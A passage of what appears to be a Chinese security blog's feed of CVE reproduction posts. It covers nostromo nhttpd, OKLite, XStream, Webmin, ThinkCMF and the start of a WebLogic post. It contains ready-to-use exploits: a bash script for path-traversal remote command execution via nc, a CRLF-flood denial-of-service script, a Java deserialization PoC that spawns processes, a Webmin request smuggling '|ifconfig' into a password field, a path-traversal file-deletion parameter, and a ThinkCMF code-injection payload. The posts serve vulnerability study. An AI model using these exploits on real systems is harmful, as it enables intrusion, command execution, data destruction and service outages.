groups=1001(sp0re)</span><br></pre></td></tr></table></figure><p>而CVE-2019-16279是在当攻击者在单连接中发送大量的 \r\n 就会导致 nhttpd 出现内存错误，从而导致决绝服务。<br>例如：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> curl http://127.0.0.1:8080</span></span><br><span class="line">HELLO!</span><br><span class="line"><span class="meta">$</span><span class="bash"> ./CVE-2019-16279.sh 127.0.0.1 8080</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> curl http://127.0.0.1:8080</span></span><br><span class="line">curl: (7) Failed to connect to 127.0.0.1 port 8080: Connection refused</span><br></pre></td></tr></table></figure><h2 id="0x4-漏洞相关脚本"><a href="#0x4-漏洞相关脚本" class="headerlink" title="0x4.漏洞相关脚本"></a>0x4.漏洞相关脚本</h2><p><code>CVE-2019-16278.sh：</code>  </p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/env bash</span></span><br><span class="line"></span><br><span class="line">HOST=&quot;$1&quot;</span><br><span class="line">PORT=&quot;$2&quot;</span><br><span class="line">shift 2</span><br><span class="line"></span><br><span class="line">( \</span><br><span class="line">    echo -n -e &#x27;POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\n&#x27;; \</span><br><span class="line">    echo -n -e &#x27;Content-Length: 1\r\n\r\necho\necho\n&#x27;; \</span><br><span class="line">    echo &quot;$@ 2&gt;&amp;1&quot; \</span><br><span class="line">) | nc &quot;$HOST&quot; &quot;$PORT&quot; \</span><br><span class="line">  | sed --quiet --expression &#x27;:S;/^\r$/&#123;n;bP&#125;;n;bS;:P;n;p;bP&#x27;</span><br></pre></td></tr></table></figure><p><code>CVE-2019-16279.sh：</code>   </p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/env bash</span></span><br><span class="line"></span><br><span class="line">HOST=&quot;$1&quot;</span><br><span class="line">PORT=&quot;$2&quot;</span><br><span class="line"></span><br><span class="line">echo -n -e &#x27;\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n&#x27; | nc &quot;$HOST&quot; &quot;$PORT&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
          <category> CVE复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> POC </tag>
            
            <tag> nostromo-nhttpd </tag>
            
            <tag> 命令执行 </tag>
            
            <tag> 路径穿越 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>发现OKLite v1.2.25 存在任意文件删除漏洞</title>
      <link href="2021/01/20/CVE-2019-16132%20OKLite%20v1.2.25%20%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/"/>
      <url>2021/01/20/CVE-2019-16132%20OKLite%20v1.2.25%20%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>OKLite v1.2.25 存在任意文件删除漏洞</p><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Ethan发现OKLite v1.2.25 存在任意文件删除漏洞（需要登录后台）</p><h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>后台删除文件时抓包修改<code>title</code>参数可以直接删除网站任意文件</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><h3 id="产品"><a href="#产品" class="headerlink" title="产品"></a>产品</h3><blockquote><p>OKLite</p></blockquote><h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><blockquote><p>OKLite v1.2.25 版本  </p></blockquote><h3 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h3><blockquote><p>OKLite  </p></blockquote><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>在主目录下创建一个index.txt用来测试</p><p><img src="https://i.loli.net/2021/01/20/ZWuPVt4q5jpiCc9.png" alt="22.png"></p><p>登录后台，在设置-&gt;风格管理</p><p><img src="https://i.loli.net/2021/01/20/yE2ZN4iQzbkGRhg.png" alt="23.png"></p><p>点击文件管理</p><p><img src="https://i.loli.net/2021/01/20/o41vV9zXcBZsbYj.png" alt="24.png"></p><p>随便删除一个文件，点击抓包，修改title参数为../../test.txt</p><p><img src="https://i.loli.net/2021/01/20/YdWKpRyaP2hkBeU.png" alt="25.png"></p><p>发送请求，主目录下的test.txt已被删除</p><p><img src="https://i.loli.net/2021/01/20/7PK6VEm2wGCbDJW.png" alt="26.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
          <category> CVE复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> POC </tag>
            
            <tag> OKLite v1.2.25 </tag>
            
            <tag> CMS </tag>
            
            <tag> 任意文件删除 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Xstream 1.4.10版本存在反序列化漏洞CVE-2013-7285补丁绕过。</title>
      <link href="2021/01/17/CVE-2019-10173%20Xstream%201.4.10%E7%89%88%E6%9C%AC%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
      <url>2021/01/17/CVE-2019-10173%20Xstream%201.4.10%E7%89%88%E6%9C%AC%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>该文章为转载总结文章，如有侵权，请联系<a href="mailto:&#x4a;&#111;&#67;&#97;&#x74;&#87;&#x46;&#89;&#x40;&#49;&#x36;&#51;&#46;&#x63;&#111;&#x6d;">&#x4a;&#111;&#67;&#97;&#x74;&#87;&#x46;&#89;&#x40;&#49;&#x36;&#51;&#46;&#x63;&#111;&#x6d;</a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>XStream是常用的Java类库，用来将对象序列化成XML （JSON）或反序列化为对象。</p><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Xstream 1.4.10版本存在反序列化漏洞CVE-2013-7285补丁绕过。</p><h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>当使用Xstream 1.4.10版本且未对安全框架进行初始化时，攻击者即可通过精心构造的请求包在使用Xstream的服务器上进行远程代码执行。</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><h3 id="产品"><a href="#产品" class="headerlink" title="产品"></a>产品</h3><blockquote><p>Xstream</p></blockquote><h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><blockquote><p>Xstream1.4.10版本</p></blockquote><h3 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h3><blockquote><p>Xstream</p></blockquote><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bigo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.beans.EventHandler;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"><span class="keyword">import</span> java.util.TreeSet;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by cfchi on 2019/7/26.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">expGen</span><span class="params">()</span></span>&#123;</span><br><span class="line">        XStream xstream = <span class="keyword">new</span> XStream();</span><br><span class="line">        Set&lt;Comparable&gt; set = <span class="keyword">new</span> TreeSet&lt;Comparable&gt;();</span><br><span class="line">        set.add(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line">        set.add(EventHandler.create(Comparable.class, <span class="keyword">new</span> ProcessBuilder(<span class="string">&quot;calc&quot;</span>), <span class="string">&quot;start&quot;</span>));</span><br><span class="line">        String payload = xstream.toXML(set);</span><br><span class="line">        System.out.println(payload);</span><br><span class="line">        <span class="keyword">return</span> payload;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        expGen();</span><br><span class="line">        XStream xStream = <span class="keyword">new</span> XStream();</span><br><span class="line">        String payload = <span class="string">&quot;&lt;sorted-set&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;string&gt;foo&lt;/string&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;dynamic-proxy&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;handler class=\&quot;java.beans.EventHandler\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;target class=\&quot;java.lang.ProcessBuilder\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;command&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    &lt;string&gt;cmd.exe&lt;/string&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    &lt;string&gt;/c&lt;/string&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    &lt;string&gt;calc&lt;/string&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;/command&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;/target&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;     &lt;action&gt;start&lt;/action&gt;&quot;</span>+</span><br><span class="line">                <span class="string">&quot;        &lt;/handler&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;/dynamic-proxy&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;/sorted-set&gt;\n&quot;</span>;</span><br><span class="line">       xStream.fromXML(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="1-4-7版本白名单"><a href="#1-4-7版本白名单" class="headerlink" title="1.4.7版本白名单"></a>1.4.7版本白名单</h3><h3 id="1-4-10版本，黑名单未开启"><a href="#1-4-10版本，黑名单未开启" class="headerlink" title="1.4.10版本，黑名单未开启"></a>1.4.10版本，黑名单未开启</h3><p><img src="https://i.loli.net/2021/01/17/d9vocMbD3JVIrzf.png" alt="14.png"></p><h3 id="1-4-11版本，黑名单开启"><a href="#1-4-11版本，黑名单开启" class="headerlink" title="1.4.11版本，黑名单开启"></a>1.4.11版本，黑名单开启</h3><blockquote><p>blacklist</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">InternalBlackList</span> <span class="keyword">implements</span> <span class="title">Converter</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">InternalBlackList</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">canConvert</span><span class="params">(Class type)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> type == Void.TYPE || type == Void.class || !XStream.<span class="keyword">this</span>.securityInitialized &amp;&amp; type != <span class="keyword">null</span> &amp;&amp; (type.getName().equals(<span class="string">&quot;java.beans.EventHandler&quot;</span>) || type.getName().endsWith(<span class="string">&quot;$LazyIterator&quot;</span>) || type.getName().startsWith(<span class="string">&quot;javax.crypto.&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">marshal</span><span class="params">(Object source, HierarchicalStreamWriter writer, MarshallingContext context)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> ConversionException(<span class="string">&quot;Security alert. Marshalling rejected.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">unmarshal</span><span class="params">(HierarchicalStreamReader reader, UnmarshallingContext context)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> ConversionException(<span class="string">&quot;Security alert. Unmarshalling rejected.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/17/XPvUkfOWSdyuw81.png" alt="15.png"></p><h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><blockquote><p>升级Xstream到1.4.11版本</p></blockquote><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://mp.weixin.qq.com/s/bght8tIwtNqnaidVZjPdSw">https://mp.weixin.qq.com/s/bght8tIwtNqnaidVZjPdSw</a><br><a href="http://x-stream.github.io/changes.html#1.4.11">http://x-stream.github.io/changes.html#1.4.11</a></p><blockquote><p>原文：<a href="http://www.polaris-lab.com/index.php/archives/658/">http://www.polaris-lab.com/index.php/archives/658/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
          <category> CVE复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> POC </tag>
            
            <tag> XStream </tag>
            
            <tag> JAVA </tag>
            
            <tag> 反序列化漏洞 </tag>
            
            <tag> CVE-2013-7285 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-15107 Webmin &lt;= 1.920 远程命令执行漏洞</title>
      <link href="2021/01/17/CVE-2019-15107%20Webmin%201.920%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
      <url>2021/01/17/CVE-2019-15107%20Webmin%201.920%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>该文章为转载总结文章，如有侵权，请联系<a href="mailto:&#74;&#111;&#67;&#x61;&#116;&#87;&#x46;&#89;&#64;&#x31;&#54;&#x33;&#46;&#x63;&#x6f;&#109;">&#74;&#111;&#67;&#x61;&#116;&#87;&#x46;&#89;&#64;&#x31;&#54;&#x33;&#46;&#x63;&#x6f;&#109;</a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>CVE-2019-15107 Webmin &lt;= 1.920 远程命令执行漏洞,漏洞需要开启密码重置功能。</p><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>CVE-2019-15107 Webmin &lt;= 1.920 远程命令执行漏洞，可以直接执行系统命令</p><h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>直接执行命令，如果webmin权限大可以直接获取到系统最高权限</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><h3 id="产品"><a href="#产品" class="headerlink" title="产品"></a>产品</h3><blockquote><p>Webmin</p></blockquote><h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><blockquote><p>Webmin &lt;= 1.920 版本  </p></blockquote><h3 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h3><blockquote><p>Webmin  </p></blockquote><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>首先开启密码重置功能:<br>在控制界面 <a href="https://ip:10000/webmin/edit_session.cgi?xnavigation=1">https://ip:10000/webmin/edit_session.cgi?xnavigation=1</a></p><p><img src="https://i.loli.net/2021/01/17/h7CVLecwpKyXObZ.png" alt="43.jpeg"></p><p>等待webmin重启，配置生效。查看webmin的配置文件，可以发现<code>passwd_mode</code>的值已经从<code>0</code>变为了<code>2</code>。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> cat /etc/webmin/miniserv.conf</span></span><br><span class="line">...</span><br><span class="line">passwd_mode=2</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/17/B6UXaiROTs9nwAJ.png" alt="44.jpeg"></p><p>数据库包如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;password_change.cgi HTTP&#x2F;1.1</span><br><span class="line">Host: yourip:10000</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 63</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Origin: https:&#x2F;&#x2F;yourip:10000</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;76.0.3809.100 Safari&#x2F;537.36</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Referer: https:&#x2F;&#x2F;yourip:10000&#x2F;session_login.cgi</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: redirect&#x3D;1; testing&#x3D;1; sessiontest&#x3D;1; sid&#x3D;x</span><br><span class="line"></span><br><span class="line">user&#x3D;root&amp;pam&#x3D;1&amp;expired&#x3D;2&amp;old&#x3D;buyaoxiedaopocli&amp;new1&#x3D;buyaoxiedaopocli&amp;new2&#x3D;buyaoxiedaopocli</span><br></pre></td></tr></table></figure><p>在参数<code>old</code>后加上<code>|ifconfig</code> 执行<code>ifconfig</code>命令。</p><p><img src="https://i.loli.net/2021/01/17/6yhwBMiKAWtHoTC.png" alt="45.jpeg"></p><p>如果user不存在，同样能执行命令</p><p><img src="https://i.loli.net/2021/01/17/NBACYWGE5cgJHKi.jpg" alt="46.jpeg"></p><blockquote><p>PS: 1.910需要传入的user不存在，否则不能执行命令。不知道更老的版本会如何。建议为了全版本使用，POC最好传入一个不存在的user。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
          <category> CVE复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> POC </tag>
            
            <tag> CVE-2019-15107 </tag>
            
            <tag> Webmin </tag>
            
            <tag> 远程命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>说明</title>
      <link href="2021/01/17/%E8%AF%B4%E6%98%8E/"/>
      <url>2021/01/17/%E8%AF%B4%E6%98%8E/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="2021-1-17"><a href="#2021-1-17" class="headerlink" title="2021.1.17"></a>2021.1.17</h2><h3 id="最近上传了部分自己用于学习的各种文章"><a href="#最近上传了部分自己用于学习的各种文章" class="headerlink" title="最近上传了部分自己用于学习的各种文章"></a>最近上传了部分自己用于学习的各种文章</h3><h3 id="如有侵权请师傅们联系我进行删除，放在自己博客上只是为了查阅和分享"><a href="#如有侵权请师傅们联系我进行删除，放在自己博客上只是为了查阅和分享" class="headerlink" title="如有侵权请师傅们联系我进行删除，放在自己博客上只是为了查阅和分享~"></a>如有侵权请师傅们联系我进行删除，放在自己博客上只是为了查阅和分享~</h3><h3 id="请联系-x4a-x6f-x43-x61-x74-87-x46-x59-64-x31-x36-x33-x2e-99-111-x6d"><a href="#请联系-x4a-x6f-x43-x61-x74-87-x46-x59-64-x31-x36-x33-x2e-99-111-x6d" class="headerlink" title="请联系&#x4a;&#x6f;&#x43;&#x61;&#x74;&#87;&#x46;&#x59;&#64;&#x31;&#x36;&#x33;&#x2e;&#99;&#111;&#x6d;"></a>请联系<a href="mailto:&#x4a;&#x6f;&#x43;&#x61;&#x74;&#87;&#x46;&#x59;&#64;&#x31;&#x36;&#x33;&#x2e;&#99;&#111;&#x6d;">&#x4a;&#x6f;&#x43;&#x61;&#x74;&#87;&#x46;&#x59;&#64;&#x31;&#x36;&#x33;&#x2e;&#99;&#111;&#x6d;</a></h3>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-7580 thinkcmf-5.0.190111后台任意文件写入导致的代码执行</title>
      <link href="2021/01/17/CVE-2019-7580%20thinkcmf-5.0.190111%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
      <url>2021/01/17/CVE-2019-7580%20thinkcmf-5.0.190111%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>该文章为转载总结文章，如有侵权，请联系<a href="mailto:&#74;&#x6f;&#67;&#x61;&#116;&#x57;&#70;&#x59;&#64;&#49;&#x36;&#51;&#46;&#x63;&#111;&#109;">&#74;&#x6f;&#67;&#x61;&#116;&#x57;&#70;&#x59;&#64;&#49;&#x36;&#51;&#46;&#x63;&#111;&#109;</a></p><h2 id="CVE-2019-7580-thinkcmf-5-0-190111后台任意文件写入导致的代码执行"><a href="#CVE-2019-7580-thinkcmf-5-0-190111后台任意文件写入导致的代码执行" class="headerlink" title="CVE-2019-7580 thinkcmf-5.0.190111后台任意文件写入导致的代码执行"></a>CVE-2019-7580 thinkcmf-5.0.190111后台任意文件写入导致的代码执行</h2><h1 id="0x00-环境搭建"><a href="#0x00-环境搭建" class="headerlink" title="0x00 环境搭建"></a>0x00 环境搭建</h1><p>首先去thinkcmf下载5.0的最新版<br><a href="https://github.com/thinkcmf/thinkcmf/archive/5.0.190111.zip">https://github.com/thinkcmf/thinkcmf/archive/5.0.190111.zip</a><br>切换到web根目录下，比如/var/www，然后新建一个目录：ThinkCMF-5.0.190111<br>把除public目录外的文件都移动到ThinkCMF-5.0.190111下。然后修改index.php，将其中的  </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">define(&#39;CMF_ROOT&#39;, __DIR__ . &#39;&#x2F;..&#x2F;&#39;);</span><br></pre></td></tr></table></figure><p>修改为  </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">define(&#39;CMF_ROOT&#39;, __DIR__ . &#39;&#x2F;ThinkCMF-5.0.190111&#x2F;&#39;);</span><br></pre></td></tr></table></figure><p>然后一步步完成安装。<br>参考：<a href="https://blog.csdn.net/youaregoo/article/details/82219722">https://blog.csdn.net/youaregoo/article/details/82219722</a>  </p><h1 id="0x01-利用过程："><a href="#0x01-利用过程：" class="headerlink" title="0x01 利用过程："></a>0x01 利用过程：</h1><p>后台登录状态下，<br>1、将payload插入数据库并读取然后写入data/conf/route.php文件  </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;portal&#x2F;admin_category&#x2F;addpost.html</span><br><span class="line">parent_id&#x3D;0&amp;name&#x3D;111&amp;alias&#x3D;a&#39;&#x3D;&gt;array(%22%22)%2csleep(5)%2c&#39;b</span><br></pre></td></tr></table></figure><p>2、然后访问：  </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;portal&#x2F;admin_category&#x2F;index.html</span><br></pre></td></tr></table></figure><p>触发  </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">include data&#x2F;conf&#x2F;route.php  </span><br></pre></td></tr></table></figure><p>操作，执行payload。下图以执行sleep(5)作为演示。  </p><p><img src="https://i.loli.net/2021/01/17/yehW4Mmstu8XKiq.png" alt="48.png"></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;portal&#x2F;admin_category&#x2F;addpost.html HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.170.209</span><br><span class="line">Content-Length: 183</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded; charset&#x3D;UTF-8</span><br><span class="line">Cookie: PHPSESSID&#x3D;of2ar92rpeucrh4cg6s4t4dae6; admin_username&#x3D;admin</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">parent_id&#x3D;0&amp;name&#x3D;111&amp;alias&#x3D;1&#39;%3D%3Earray(%22%22)%2Cphpinfo()%2C&#39;2</span><br></pre></td></tr></table></figure><h2 id="测试demo"><a href="#测试demo" class="headerlink" title="测试demo"></a>测试demo</h2><p><img src="https://i.loli.net/2021/01/17/suUBSPoIG4M9zlL.gif" alt="49.gif"></p><blockquote><p>来源： <a href="https://xz.aliyun.com/t/3997">https://xz.aliyun.com/t/3997</a> </p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
          <category> CVE复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> POC </tag>
            
            <tag> CMS </tag>
            
            <tag> CVE-2019-7580 </tag>
            
            <tag> 任意文件写入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-2890-Oracle WebLogic 反序列化严重漏洞</title>
      <link href="2021/01/17/CVE-2019-2890-Oracle%20WebLogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%A5%E9%87%8D%E6%BC%8F%E6%B4%9E/"/>
      <url>2021/01/17/CVE-2019-2890-Oracle%20WebLogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%A5%E9%87%8D%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>该文章为转载总结文章，如有侵权，请联系<a href="mailto:&#74;&#111;&#67;&#97;&#x74;&#x57;&#x46;&#x59;&#x40;&#x31;&#54;&#51;&#x2e;&#99;&#x6f;&#x6d;">&#74;&#111;&#67;&#97;&#x74;&#x57;&#x46;&#x59;&#x40;&#x31;&#54;&#51;&#x2e;&#99;&#x6f;&#x6d;</a></p><h2 id="CVE-2019-2890-Oracle-WebLogic-反序列化严重漏洞"><a href="#CVE-2019-2890-Oracle-WebLogic-反序列化严重漏洞" class="headerlink" title="CVE-2019-2890-Oracle WebLogic 反序列化严重漏洞"></a>CVE-2019-2890-Oracle WebLogic 反序列化严重漏洞</h2><h3 id="漏洞背景"><a href="#漏洞背景" class="headerlink" title="漏洞背景"></a>漏洞背景</h3><p>HSCERT监测发现WebLogic官方发布了CVE-2019-2890漏洞预警。此漏洞存在于Weblogic Console组件中，未经授权的攻击者可以发送精心构造的恶意 HTTP 请求，获取服务器权限。</p><p>WebLogic 是 Oracle 公司出品的基于 JavaEE 